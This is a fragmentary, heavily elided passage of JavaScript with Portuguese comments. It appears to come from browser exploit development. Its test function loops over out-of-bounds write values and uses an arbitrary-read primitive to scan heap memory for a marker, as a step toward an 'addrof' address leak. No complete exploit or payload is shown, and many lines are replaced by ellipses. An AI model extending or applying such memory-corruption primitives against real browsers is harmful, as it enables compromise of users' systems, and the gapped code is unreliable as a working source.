...
const SCAN_HEAP_END_ADDRESS_R31 = new AdvancedInt64(0x0, 0x8A100000); // Reduzido para teste mais rápido   
...
export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R31() { 
    ...
    for (const current_oob_value of OOB_WRITE_VALUES_V82) {
            ...
            if (heisenbugConfirmedThisIter) { 
                try {
                    ...
                    for (let current_scan_addr = new AdvancedInt64(SCAN_HEAP_START_ADDRESS_R31.low(), SCAN_HEAP_START_ADDRESS_R31.high()); 
                        ...
                        if (current_scan_addr.low() % (SCAN_STEP_R31 * 100) === 0) {logS3(`  MemScan: Escaneando em ${current_scan_addr.toString(true)}...`, 'debug');}
                        try {
                            const value_at_addr = await arb_read(current_scan_addr, 8); // arb_read já retorna AdvancedInt64
                            // <<<< CORRIGIDO: Checa se value_at_addr é AdvancedInt64 antes de .equals >>>>
                            ...
                            // Se arb_read falhar (ex: "low/high must be uint32 numbers"), o try/catch aqui pega.
                            if (current_scan_addr.low() % (SCAN_STEP_R31 * 100) === 0) { // Logar erros de leitura esporadicamente
                                logS3(`  MemScan: Erro ao ler/processar ${current_scan_addr.toString(true)}: ${e_scan_read.message}`, 'warn');
                            }
                        }
                        await PAUSE_S3(0); 
                    }
                    if (!found_marker_addr) iter_memory_scan_result.msg = `MemScan: Marcador não encontrado na faixa ${SCAN_HEAP_START_ADDRESS_R31.toString(true)} - ${SCAN_HEAP_END_ADDRESS_R31.toString(true)}.`;
                } catch (e_mem_scan) {
        ...
        let current_iter_summary = { /* ... (como na R28) ... */ 
        ...
        // Lógica de best_result_for_runner (R31) - como na R28
        ...
        if (current_score > best_score || (current_score > 0 && !best_result_for_runner.oob_value_used) ) { best_result_for_runner = { ...current_iter_summary }; }
        else if (!best_result_for_runner.oob_value_used && current_oob_value === OOB_WRITE_VALUES_V82[OOB_WRITE_VALUES_V82.length - 1]) { best_result_for_runner = { ...current_iter_summary }; }
    ...
    return { /* ... (como na R28) ... */ 
        ...
        stringifyResult:best_result_for_runner.stringifyResult, memory_scan_result: best_result_for_runner.memory_scan_result, 
